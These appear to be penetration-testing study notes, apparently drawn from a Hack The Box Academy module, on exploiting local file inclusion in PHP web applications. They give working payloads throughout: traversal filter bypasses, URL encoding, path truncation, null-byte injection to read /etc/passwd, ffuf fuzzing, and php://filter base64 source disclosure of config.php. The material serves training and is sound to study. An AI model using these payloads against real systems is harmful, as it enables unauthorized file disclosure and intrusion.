## Table of Contents

  - [Path Traversal Bypass Techniques](#Path\Traversal\Bypass\Techniques)
          - [Input Filters](#Input\Filters)
          - [Relevant: Conversion Filters](#Relevant:\Conversion\Filters)
          - [Fuzzing for PHP Files](#Fuzzing\for\PHP\Files)
        - [Standard LFI](#Standard\LFI)
    - [**1. Non-Recursive Path Traversal Filters**](#**1.\Non-Recursive\Path\Traversal\Filters**)
    - [**2. Encoding to Bypass Filters**](#**2.\Encoding\to\Bypass\Filters**)
    - [**3. Approved Paths**](#**3.\Approved\Paths**)
    - [**4. Handling Appended Extensions**](#**4.\Handling\Appended\Extensions**)
      - [**a. Path Truncation**](#**a.\Path\Truncation**)
      - [**b. Null Bytes**](#**b.\Null\Bytes**)
      - [Null Bytes](#Null\Bytes)
  - [LFI Exploitation using PHP Filters](#LFI\Exploitation\using\PHP\Filters)
    - [**1. Introduction to PHP Wrappers**](#**1.\Introduction\to\PHP\Wrappers**)
    - [**2. Utilizing Input Filters**](#**2.\Utilizing\Input\Filters**)
    - [**3. Fuzzing for PHP Files**](#**3.\Fuzzing\for\PHP\Files**)
    - [**4. Standard PHP Inclusion**](#**4.\Standard\PHP\Inclusion**)
    - [**5. Source Code Disclosure using Base64 PHP Filter**](#**5.\Source\Code\Disclosure\using\Base64\PHP\Filter**)
  - [Source Code Disclosure](#Source\Code\Disclosure)

## Path Traversal Bypass Techniques

Path traversal vulnerabilities, especially in LFI scenarios, can sometimes be mitigated by developers using filters or certain patterns. However, with the right technique, these measures can often be bypassed.
###### Input Filters
PHP filters are  a type of wrappers.
4 types:
- String Filters
- Conversion Filters
- Compression Filters
- Encryption Filters
###### Relevant: Conversion Filters
`convert.base64-encode` under Conversion Filters

###### Fuzzing for PHP Files
`ffuf\\gobuster`
```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php
```

##### Standard LFI
If standard LFI is allowed anythin input will get .php appended to it and rendered as a normal html page. 

More interedted in reading source code for important information about the Web App. This is where the `base64` filter gets useful, use it to encode the php file. and then we would get the encoded source code instead of having it being executed and rendered. Especially useful for cases where we are dealing with LFI with appended php extensions, may be resitricted to including php files only. 

### **1. Non-Recursive Path Traversal Filters**
Basic LFI filters might simply delete substrings like `../` to prevent path traversals:

```php
$language = str_replace('../', '', $_GET['language']);
```

But, these are not recursively removing the `../` substring, leading to potential bypasses using `....//`, `..././`, or `....\/`.

### **2. Encoding to Bypass Filters**

Some web applications filter out specific characters linked with LFI attacks. Bypassing can be achieved by URL encoding:

* `.` -> `%2e`
* `/` -> `%2f`

For instance, if `../` is restricted, it can be encoded as `%2e%2e%2f` to potentially bypass the filter.

> **Tip**: Tools like Burp Suite's Decoder can be used for encoding and double encoding.

### **3. Approved Paths**

Certain applications use Regular Expressions to permit paths under specific directories:

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
}
```

This can be bypassed by starting the payload with the approved path, followed by the traversal patterns.

### **4. Handling Appended Extensions**

Applications appending extensions to the path (e.g., `.php`) can restrict the exploitation:

```php
include($_GET['language'] . ".php");
```

However, older PHP versions had certain limitations that allowed for bypass techniques:

#### **a. Path Truncation**

PHP's string length limitation on older versions (< 5.4) can be exploited. By creating a string close to the 4096-character limit, any appended data by the server (like `.php`) can be truncated.

Example:
```
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

> **Note**: The exact length must be calculated to ensure only `.php` gets truncated.

#### **b. Null Bytes**

Older PHP versions (< 5.5) were susceptible to null byte injection. This can be used to truncate strings in memory:

Example:
```
/etc/passwd%00
```

In this case, `.php` appended after `%00` would be ignored, allowing for a bypass.

---

Bypassing LFI filters demands a keen understanding of both the filtering mechanism and the underlying server architecture. With the correct technique, even well-intended filters can be circumvented.


If we combine both of these PHP limitations together, we can create very long strings that evaluate to a correct path. Whenever we reach the 4096 character limitation, the appended extension (`.php`) would be truncated, and we would have a path without an appended extension. Finally, it is also important to note that we would also need to `start the path with a non-existing directory` for this technique to work.

An example of such payload would be the following:

Code: url

```url
?language=non_existing_directory/../../../etc/passwd/./././.[./ REPEATED ~2048 times]
```

Of course, we don't have to manually type `./` 2048 times (total of 4096 characters), but we can automate the creation of this string with the following command:

  Path Truncation

```shell-session
gdxqpardo@htb[/htb]$ echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
non_existing_directory/../../../etc/passwd/./././<SNIP>././././
```

We may also increase the count of `../`, as adding more would still land us in the root directory, as explained in the previous section. However, if we use this method, we should calculate the full length of the string to ensure only `.php` gets truncated and not our requested file at the end of the string (`/etc/passwd`). This is why it would be easier to use the first method.

#### Null Bytes

PHP versions before 5.5 were vulnerable to `null byte injection`, which means that adding a null byte (`%00`) at the end of the string would terminate the string and not consider anything after it. This is due to how strings are stored in low-level memory, where strings in memory must use a null byte to indicate the end of the string, as seen in Assembly, C, or C++ languages.

To exploit this vulnerability, we can end our payload with a null byte (e.g. `/etc/passwd%00`), such that the final path passed to `include()` would be (`/etc/passwd%00.php`). This way, even though `.php` is appended to our string, anything after the null byte would be truncated, and so the path used would actually be `/etc/passwd`, leading us to bypass the appended extension.



**If we identify an LFI vulnerability in PHP web applications, then we can utilize different [PHP Wrappers](https://www.php.net/manual/en/wrappers.php.php) to be able to extend our LFI exploitation, and even potentially reach remote code execution.**

## LFI Exploitation using PHP Filters

PHP Filters provide an intriguing opportunity for attackers targeting LFI vulnerabilities. These wrappers, provided by PHP, are used to access various I/O streams at the application level.

### **1. Introduction to PHP Wrappers**

PHP Wrappers allow you to access:
- Standard input/output
- File descriptors
- Memory streams

For attackers, PHP Wrappers extend LFI exploitation capabilities. Specifically, PHP filters can be exploited to read PHP source codes or execute system commands.

### **2. Utilizing Input Filters**

The PHP filter wrapper can be accessed with the `php://filter/` scheme. The main parameters required for attacks are `resource` and `read`.

For LFI attacks, a useful filter is the `convert.base64-encode` filter under Conversion Filters.

### **3. Fuzzing for PHP Files**

Before exploiting, an attacker would aim to identify available PHP pages using tools like `ffuf` or `gobuster`.

Example:
```
ffuf -w /path/to/wordlist:FUZZ -u http://target/FUZZ.php
```

> **Note**: Not just `200 OK` responses are valuable; also consider `301`, `302`, and `403` responses.

### **4. Standard PHP Inclusion**

If you attempt LFI on a PHP file, the file often gets executed and rendered. For instance:
```
http://<SERVER_IP>:<PORT>/index.php?language=config
```
However, this approach provides the executed output, not the source code. Reading the PHP source code becomes vital, especially when dealing with configurations or hidden functionalities.

### **5. Source Code Disclosure using Base64 PHP Filter**

To extract the PHP source code without executing it, you can use the base64 PHP filter. It encodes the PHP file in base64, which when decoded, provides the source code.

Example:
```bash
http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config
```

Once you obtain the base64 encoded string, it can be decoded to get the source code:
```bash
echo 'BASE64_STRING' | base64 -d
```

This method enables attackers to peruse through the source code, find sensitive information, or gain deeper insights into the application's workings.

---

Exploiting LFI vulnerabilities using PHP filters requires a deep understanding of how PHP handles I/O streams and how it processes included files. This knowledge, paired with the right tools, can allow an attacker to disclose sensitive files and potentially further exploit the system.

## Source Code Disclosure

Once we have a list of potential PHP files we want to read, we can start disclosing their sources with the `base64` PHP filter. Let's try to read the source code of `config.php` using the base64 filter, by specifying `convert.base64-encode` for the `read` parameter and `config` for the `resource` parameter, as follows:

Code: url

```url
php://filter/read=convert.base64-encode/resource=config
```

   

![](https://academy.hackthebox.com/storage/modules/23/lfi_config_wrapper.png)

**Note:** We intentionally left the resource file at the end of our string, as the `.php` extension is automatically appended to the end of our input string, which would make the resource we specified be `config.php`.

As we can see, unlike our attempt with regular LFI, using the base64 filter returned an encoded string instead of the empty result we saw earlier. We can now decode this string to get the content of the source code of `config.php`, as follows:

```shell-session
gdxqpardo@htb[/htb]$ echo 'PD9waHAK...SNIP...KICB9Ciov' | base64 -d

...SNIP...

if ($_SERVER['REQUEST_METHOD'] == 'GET' && realpath(__FILE__) == realpath($_SERVER['SCRIPT_FILENAME'])) {
  header('HTTP/1.0 403 Forbidden', TRUE, 403);
  die(header('location: /index.php'));
}

...SNIP...
```